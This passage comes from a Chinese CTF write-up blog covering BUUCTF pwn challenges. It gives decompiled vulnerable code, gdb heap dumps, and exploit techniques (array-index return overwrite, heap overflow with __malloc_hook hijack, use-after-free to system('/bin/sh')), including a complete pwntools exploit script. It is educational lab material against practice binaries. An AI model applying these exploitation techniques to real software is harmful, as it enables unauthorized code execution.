class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="wustctf2020-name-your-cat"><a href="#wustctf2020-name-your-cat" class="headerlink" title="wustctf2020_name_your_cat"></a><a href="https://buuoj.cn/challenges#wustctf2020_name_your_cat">wustctf2020_name_your_cat</a></h2><p>检查保护</p><pre class="line-numbers language-none"><code class="language-none">➜  wustctf2020_name_your_cat checksec pwn[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;wustctf2020_name_your_cat&#x2F;pwn&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题主要考的是逆向读代码，对<code>index</code>没有限制，虽然开了<code>canary</code>不能直接溢出但是可以通过数组定位直接任意地址写，<code>v1</code>是栈上的一个地址，计算其与保存了返回到<code>main</code>函数的地址的偏移再除以<code>8</code>即可向返回地址写入，改成<code>shell</code>函数即可<code>getshell</code>，但是要把5次循环结束</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl NameWhich(int v1)&#123;  int index[4]; &#x2F;&#x2F; [esp+18h] [ebp-10h] BYREF  index[1] &#x3D; __readgsdword(0x14u);  printf(&quot;Name for which?\n&gt;&quot;);  __isoc99_scanf(&quot;%d&quot;, index);  printf(&quot;Give your name plz: &quot;);  __isoc99_scanf(&quot;%7s&quot;, 8 * index[0] + v1);  return index[0];&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Name for which?'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Give your name plz: '</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>shell <span class="token operator">=</span> <span class="token number">0x80485CB</span>get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>get<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>get<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>get<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>get<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>shell<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a><a href="https://buuoj.cn/challenges#hitcontraining_bamboobox">hitcontraining_bamboobox</a></h2><p>检查保护：没有开地址随机化</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">☁  bamboobox  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/buuctf/bamboobox/pwn'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x3fc000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析程序：</p><p>这是一道<code>2.23-0ubuntu11</code>的堆题，<code>libc 2.23</code>中在任意地址写的时候限制写的地址所识别的‘堆’大小与创建大小一致</p><p>存后门函数实现<code>orw</code>，但是<code>buuctf</code>的远程文件路径大概率不是这个</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __noreturn <span class="token function">magic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-74h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-70h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+78h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/home/bamboobox/flag"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x64uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其他函数主要就是堆的增删改查，<code>bss</code>段存在堆管理，漏洞点出在<code>edit</code>函数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">unsigned __int64 change_item()&#123;  int v1; &#x2F;&#x2F; [rsp+4h] [rbp-2Ch]  int v2; &#x2F;&#x2F; [rsp+8h] [rbp-28h]  char buf[16]; &#x2F;&#x2F; [rsp+10h] [rbp-20h] BYREF  char nptr[8]; &#x2F;&#x2F; [rsp+20h] [rbp-10h] BYREF  unsigned __int64 v5; &#x2F;&#x2F; [rsp+28h] [rbp-8h]  v5 &#x3D; __readfsqword(0x28u);  if ( num )  &#123;    printf(&quot;Please enter the index of item:&quot;);    read(0, buf, 8uLL);    v1 &#x3D; atoi(buf);    if ( *(_QWORD *)&amp;itemlist[4 * v1 + 2] )    &#123;      printf(&quot;Please enter the length of item name:&quot;);&#x2F;&#x2F; vuln      read(0, nptr, 8uLL);      v2 &#x3D; atoi(nptr);      printf(&quot;Please enter the new name of the item:&quot;);      *(_BYTE *)(*(_QWORD *)&amp;itemlist[4 * v1 + 2] + (int)read(0, *(void **)&amp;itemlist[4 * v1 + 2], v2)) &#x3D; 0;    &#125;    else    &#123;      puts(&quot;invaild index&quot;);    &#125;  &#125;  else  &#123;    puts(&quot;No item in the box&quot;);  &#125;  return __readfsqword(0x28u) ^ v5;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在原先创建堆的时候就已经创建好一定大小的堆了，<code>edit</code>功能中还可以控制输入长度，因此可以造成堆溢出，接下来就是构造堆来泄露<code>libc</code>并改<code>__malloc_hook</code>了</p><p>泄露<code>libc</code>：<code>printf</code>输出的时候会被<code>\x00</code>截断，而且程序控制输入值的最后一位改成<code>0</code>，所以不能通过控制输入值覆盖掉<code>\x00</code>来输出<code>libc</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">*(_BYTE *)(*(_QWORD *)&amp;itemlist[4 * v1 + 2] + (int)read(0, *(void **)&amp;itemlist[4 * v1 + 2], v2)) &#x3D; 0;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首先创建三个堆，其中第一个堆用于修改第二个堆的大小，第二个堆用于覆盖第三个堆，其中第二个堆和第三个堆的大小之和要大于<code>unsorted bin</code>的大小</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> heapAllocated chunk <span class="token operator">|</span> PREV_INUSEAddr: 0x603020Size: 0x20 <span class="token punctuation">(</span>with flag bits: 0x21<span class="token punctuation">)</span>Allocated chunk <span class="token operator">|</span> PREV_INUSEAddr: 0x603040Size: 0x20 <span class="token punctuation">(</span>with flag bits: 0x21<span class="token punctuation">)</span>Allocated chunk <span class="token operator">|</span> PREV_INUSEAddr: 0x603060Size: 0xa0 <span class="token punctuation">(</span>with flag bits: 0xa1<span class="token punctuation">)</span>Top chunk <span class="token operator">|</span> PREV_INUSEAddr: 0x603100Size: 0x20d60 <span class="token punctuation">(</span>with flag bits: 0x20d61<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来用第一个堆改变第二个堆去覆盖第三个堆，释放第二个堆之后在<code>fd</code>和<code>bk</code>的位置中存在<code>libc</code>地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> heapAllocated chunk <span class="token operator">|</span> PREV_INUSEAddr: 0x603020Size: 0x20 <span class="token punctuation">(</span>with flag bits: 0x21<span class="token punctuation">)</span>Free chunk <span class="token punctuation">(</span>unsortedbin<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSEAddr: 0x603040Size: 0xc0 <span class="token punctuation">(</span>with flag bits: 0xc1<span class="token punctuation">)</span>fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78<span class="token punctuation">..</span>.Top chunk <span class="token operator">|</span> PREV_INUSEAddr: 0x603200Size: 0x20c60 <span class="token punctuation">(</span>with flag bits: 0x20c61<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时创建一个堆将从<code>unsorted bin</code>中切割，切割之后<code>libc</code>会落在剩余的<code>unsorted bin</code>的堆中，控制创建的堆大小使得<code>libc</code>恰好落在第三个堆的<code>fd</code>位置，控制创建的堆大小为<code>0x18</code>时<code>libc</code>恰好会落在第三个堆上并且第三个堆仍然存在没有被释放，此时使用<code>show</code>功能即可获取<code>libc</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/20gx 0x6030200x603020:0x00000000000000000x00000000000000210x603030:0x61616161616161610x61616161616161610x603040:0x61616161616161610x00000000000000210x603050:0x00007ffff7dd00620x00007ffff7dd1c280x603060:0x61616161616161610x00000000000000a10x603070:0x00007ffff7dd1b780x00007ffff7dd1b780x603080:0x61616161616161610x61616161616161610x603090:0x61616161616161610x61616161616161610x6030a0:0x61616161616161610x61616161616161610x6030b0:0x61616161616161610x6161616161616161<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来利用<code>fast bin</code>实现任意地址写，将<code>__malloc_hook</code>改为<code>gadget</code>，需要注意的是不能直接将<code>fd</code>改成<code>__malloc_hook</code>，而要利用<code>find_fake_chunk</code>找到合适的<code>fake_chunk</code>来间接修改<code>__malloc_hook</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> binfastbins0x70: 0x603190 —▸ 0x7ffff7dd1aed ◂— 0xfff7a92e20000000unsortedbinall: 0x603060 —▸ 0x7ffff7dd1b78 ◂— 0x603060 /* <span class="token string">'`0`'</span> */smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后释放<code>fake chunk</code>会调用<code>munmap_chunk</code>，释放的时候会报非法地址的错误，最后会调用<code>__malloc_hook，</code>实现<code>getshell</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">► 0x7ffff7afd2a4    mov    rax, qword ptr [rip + 0x2d3c0d]   0x7ffff7afd2ab    lea    rsi, [rsp + 0x50]   0x7ffff7afd2b0    lea    rdi, [rip + 0x9caa0]   0x7ffff7afd2b7    mov    rdx, qword ptr [rax]   0x7ffff7afd2ba    call   execve                &lt;execve&gt;    0x7ffff7afd2bf    call   abort                &lt;abort&gt;    0x7ffff7afd2c4    lea    rax, [rip + 0x9ca8c]   0x7ffff7afd2cb    mov    qword ptr [rsp + 0x68], 0   0x7ffff7afd2d4    mov    qword ptr [rsp + 0x50], rax   0x7ffff7afd2d9    mov    rax, qword ptr [rsp + 0x20]   0x7ffff7afd2de    mov    qword ptr [rsp + 0x60], rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="actf-2019-babyheap"><a href="#actf-2019-babyheap" class="headerlink" title="actf_2019_babyheap"></a><a href="https://buuoj.cn/challenges#actf_2019_babyheap">actf_2019_babyheap</a></h2><p>检查保护：没开地址随机化</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">☁  actf_2019_babyheap  checksec pwn         <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/buuctf/actf_2019_babyheap/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x3ff000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析函数：</p><p>就是简单的增删查功能，其中删除功能中存在<code>UAF</code>漏洞</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ( v1 &gt;&#x3D; 0 &amp;&amp; v1 &lt; count )  &#123;    if ( ptr[v1] )    &#123;      free((void *)ptr[v1]-&gt;content_ptr);      free(ptr[v1]);                            &#x2F;&#x2F; vuln    &#125;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>并且程序中存在<code>system</code>和<code>/bin/sh</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.plt.got:00000000004007A0                               ; int system(const char *command).plt.got:00000000004007A0                               system proc near                        ; CODE XREF: menu+7B↓p.plt.got:00000000004007A0 FF 25 0A 18 20 00             jmp     cs:system_ptr.plt.got:00000000004007A0.plt.got:00000000004007A0                               system endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.data:0000000000602010 2F                            db  2Fh <span class="token punctuation">;</span> /.data:0000000000602011 <span class="token number">62</span>                            db  62h <span class="token punctuation">;</span> b.data:0000000000602012 <span class="token number">69</span>                            db  69h <span class="token punctuation">;</span> i.data:0000000000602013 6E                            db  6Eh <span class="token punctuation">;</span> n.data:0000000000602014 2F                            db  2Fh <span class="token punctuation">;</span> /.data:0000000000602015 <span class="token number">73</span>                            db  73h <span class="token punctuation">;</span> s.data:0000000000602016 <span class="token number">68</span>                            db  68h <span class="token punctuation">;</span> h.data:0000000000602017 00                            db    <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建堆的逻辑：先创建一个堆管理用于存储<code>printf</code>函数和保存堆内容的堆的地址，再根据长度创建一个存储堆内容的堆</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> count <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>heap <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>func <span class="token operator">=</span> print<span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        len <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        v0 <span class="token operator">=</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        v0<span class="token operator">-></span>content_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>content_ptr<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>count<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查的逻辑：调用堆管理中的<code>printf</code>，传递参数为堆管理中的堆指针中的内容</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ( v1 &gt;&#x3D; 0 &amp;&amp; v1 &lt; count )  &#123;    if ( ptr[v1] )      (*(void (__fastcall **)(__int64))&amp;ptr[v1]-&gt;func)(ptr[v1]-&gt;content_ptr);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此只需要想办法让<code>show</code>函数这里的<code>content_ptr</code>改成<code>/bin/sh</code>的地址，让<code>func</code>改成<code>system</code>的地址即可</p><p>构造：由于存在<code>UAF</code>漏洞，即释放的堆管理地址仍然存在，所以在<code>show</code>的时候仍然可以利用释放过的堆，而控制堆管理则需要分析堆的创建过程:创建一个<code>0x20</code>的堆和一个指定大小的堆</p><p>那么创建两个大小大于<code>0x20</code>的堆时释放它们的时候它们的堆管理都进入<code>fast bin</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> heapAllocated chunk <span class="token operator">|</span> PREV_INUSEAddr: 0x2207000Size: 0x250 <span class="token punctuation">(</span>with flag bits: 0x251<span class="token punctuation">)</span>Free chunk <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSEAddr: 0x2207250Size: 0x20 <span class="token punctuation">(</span>with flag bits: 0x21<span class="token punctuation">)</span>fd: 0x00Free chunk <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSEAddr: 0x2207270Size: 0x70 <span class="token punctuation">(</span>with flag bits: 0x71<span class="token punctuation">)</span>fd: 0x00Free chunk <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSEAddr: 0x22072e0Size: 0x20 <span class="token punctuation">(</span>with flag bits: 0x21<span class="token punctuation">)</span>fd: 0x2207260Free chunk <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSEAddr: 0x2207300Size: 0x70 <span class="token punctuation">(</span>with flag bits: 0x71<span class="token punctuation">)</span>fd: 0x2207280Top chunk <span class="token operator">|</span> PREV_INUSEAddr: 0x2207370Size: 0x20c90 <span class="token punctuation">(</span>with flag bits: 0x20c91<span class="token punctuation">)</span>pwndbg<span class="token operator">></span> bintcachebins0x20 <span class="token punctuation">[</span>  <span class="token number">2</span><span class="token punctuation">]</span>: 0x22072f0 —▸ 0x2207260 ◂— 0x00x70 <span class="token punctuation">[</span>  <span class="token number">2</span><span class="token punctuation">]</span>: 0x2207310 —▸ 0x2207280 ◂— 0x0fastbinsemptyunsortedbinemptysmallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时创建一个<code>0x20</code>的堆，其中堆管理和实际输入内容的堆大小都是<code>0x20</code>，两个堆都是从之前释放的<code>fast bin</code>中取值，而<code>fast bin</code>中原先存在的两个堆就是用于管理的堆。因此创建一个<code>0x20</code>的堆之后可控的那个堆必然在其中一个堆管理的地址上，此时控制了<code>func</code>和<code>content_ptr</code>地址的内容再去<code>show</code>即可执行<code>system(&#39;/bin/sh&#39;)</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> heapAllocated chunk <span class="token operator">|</span> PREV_INUSEAddr: 0x1e2a000Size: 0x250 <span class="token punctuation">(</span>with flag bits: 0x251<span class="token punctuation">)</span>Free chunk <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSEAddr: 0x1e2a250Size: 0x20 <span class="token punctuation">(</span>with flag bits: 0x21<span class="token punctuation">)</span>fd: 0x00Free chunk <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSEAddr: 0x1e2a270Size: 0x70 <span class="token punctuation">(</span>with flag bits: 0x71<span class="token punctuation">)</span>fd: 0x00Allocated chunk <span class="token operator">|</span> PREV_INUSEAddr: 0x1e2a2e0Size: 0x20 <span class="token punctuation">(</span>with flag bits: 0x21<span class="token punctuation">)</span>Free chunk <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSEAddr: 0x1e2a300Size: 0x70 <span class="token punctuation">(</span>with flag bits: 0x71<span class="token punctuation">)</span>fd: 0x1e2a280Top chunk <span class="token operator">|</span> PREV_INUSEAddr: 0x1e2a370Size: 0x20c90 <span class="token punctuation">(</span>with flag bits: 0x20c91<span class="token punctuation">)</span>pwndbg<span class="token operator">></span> x/20gx 0x1e2a2e00x1e2a2e0:0x00000000000000000x00000000000000210x1e2a2f0:0x0000000001e2a2600x000000000040098a0x1e2a300:0x00000000000000000x00000000000000710x1e2a310:0x0000000001e2a2800x00000000000000000x1e2a320:0x00000000000000000x00000000000000000x1e2a330:0x00000000000000000x00000000000000000x1e2a340:0x00000000000000000x00000000000000000x1e2a350:0x00000000000000000x00000000000000000x1e2a360:0x00000000000000000x00000000000000000x1e2a370:0x00000000000000000x0000000000020c91pwndbg<span class="token operator">></span> x/20gx 0x000000000040098a0x40098a:0x20ec8348e58948550x048b4864e87d89480x40099a:0x45894800000028250x48e8458b48c031f80x4009aa:0xb800400e68bfc6890xfffdede8000000000x4009ba:0x4864f8458b4890ff0x74000000282504330x4009ca:0xc3c9fffffdc0e8050x10ec8348e58948550x4009da:0x00002825048b48640xbfc031f8458948000x4009ea:0xfffd95e800400e800x8be800400ea0bfff0x4009fa:0x00400e80bffffffd0x0ec0bffffffd81e80x400a0a:0xbffffffd77e800400xfffd6de800400ee00x400a1a:0x63e800400f00bfff0x00400f20bffffffd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"> 0x400cec    mov    edx, dword ptr [rbp - 0x24]  0x400cef    movsxd rdx, edx  0x400cf2    mov    rdx, qword ptr [rdx*8 + 0x602060]  0x400cfa    mov    rdx, qword ptr [rdx]  0x400cfd    mov    rdi, rdx► 0x400d00    call   rax                           &lt;system@plt&gt;       command: 0x602010 ◂— 0x68732f6e69622f &#x2F;* &#39;&#x2F;bin&#x2F;sh&#39; *&#x2F;  0x400d02    mov    rax, qword ptr [rbp - 8]  0x400d06    xor    rax, qword ptr fs:[0x28]  0x400d0f    je     0x400d16                      &lt;0x400d16&gt;  0x400d11    call   __stack_chk_fail@plt                      &lt;__stack_chk_fail@plt&gt;  0x400d16    leave  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="极客大挑战-2019-Not-Bad"><a href="#极客大挑战-2019-Not-Bad" class="headerlink" title="[极客大挑战 2019]Not Bad"></a>[极客大挑战 2019]Not Bad</h2><p>没有开任何保护，开了沙箱，可以使用<code>orw</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">not_bad  seccomp-tools dump ./pwn line  CODE  JT   